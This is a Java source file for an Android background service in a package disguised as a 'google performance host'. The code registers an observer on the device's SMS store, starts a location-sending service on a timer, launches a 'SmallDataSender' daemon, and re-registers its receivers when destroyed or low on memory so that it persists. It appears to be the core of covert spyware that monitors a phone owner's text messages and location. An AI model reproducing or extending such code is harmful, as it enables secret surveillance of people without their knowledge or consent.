package com.example.tiber.googleperformancehost.Services.Daemons;

import android.content.ContentResolver;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import com.example.tiber.googleperformancehost.BroadcastReceivers.SmsOutObserver;
import com.example.tiber.googleperformancehost.BroadcastReceivers.TickReceiver;
import com.example.tiber.googleperformancehost.R;
import com.example.tiber.googleperformancehost.Services.Abstract.MainAbstractService;
import com.example.tiber.googleperformancehost.Services.Temporary.GPSLocatorIntentService;
import com.example.tiber.googleperformancehost.Services.Temporary.LocatorIntentService;
import com.example.tiber.googleperformancehost.SharedClasses.Utils.DateUtil;

/**
 * Created by tiber on 10/14/2016.
 */

public class MainDaemonService extends MainAbstractService {

    private int LOCATION_SEND_FREQUENCY_MINUTES;
    ContentResolver contentResolver;
    @Nullable
    private static final String dataFromIntentKey = "dataFrom";
    public IBinder onBind(Intent intent) {
        Log.wtf("debug","MainDaemonService::onBind()");
        return null;
    }

    @Override
    public void onCreate() {
        Log.wtf("debug","MainDaemonService::onCreate()");
        super.onCreate();
        registerReceivers();
        LOCATION_SEND_FREQUENCY_MINUTES = appContext.getResources().getInteger(R.integer.LOCATION_SEND_FREQUENCY_MINUTES);


    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent,flags,startId);//needs to be called asap, not returned
        Log.wtf("debug","MainDaemonService::onStartCommand()");
        registerReceivers();
        startOtherDaemons();
        go();

        return START_STICKY;
    }

    private void startOtherDaemons() {
        Intent startService = new Intent(appContext, SmallDataSender.class);
        startService.putExtra("what","justStart"); // keep alive
        appContext.startService(startService);
        //// TODO: add more maybe
    }

    @Override
    public void onDestroy() {
        Log.wtf("debug","MainDaemonService::onDestroy()");
        registerReceivers();
    }

    @Override
    public void onLowMemory() {
        Log.wtf("debug","MainDaemonService::onLowMemory()");
        registerReceivers();
    }

    @Override
    public void onTrimMemory(int level) {
        Log.wtf("debug","MainDaemonService::onTrimMemory()");
        registerReceivers();

    }

    @Override
    public boolean onUnbind(Intent intent) {
        Log.wtf("debug","MainDaemonService::onUnbind()");
        return super.onUnbind(intent);

    }

    private void registerReceivers(){
        IntentFilter inf = new IntentFilter();
        inf.addAction(Intent.ACTION_TIME_TICK);
        appContext.registerReceiver(TickReceiver.getInstance(),inf);

        contentResolver = appContext.getContentResolver();
        contentResolver.registerContentObserver(Uri.parse("content://sms"), true, SmsOutObserver.getInstance(appContext));
    }

    private void go() {
        ///Send location
        int timeofLatestLocatorStarted = getLatestTimeLocatorStarted(); // in seconds
        int minutesSinceLatestLocationSent = (DateUtil.nowIntFormat() - timeofLatestLocatorStarted) / 60;

        if( minutesSinceLatestLocationSent >= LOCATION_SEND_FREQUENCY_MINUTES ){
           //start locator service(s)
            appContext.startService(new Intent(appContext, LocatorIntentService.class));
            updateTimeOfLatestLocatorStarted();
        }

    }


}
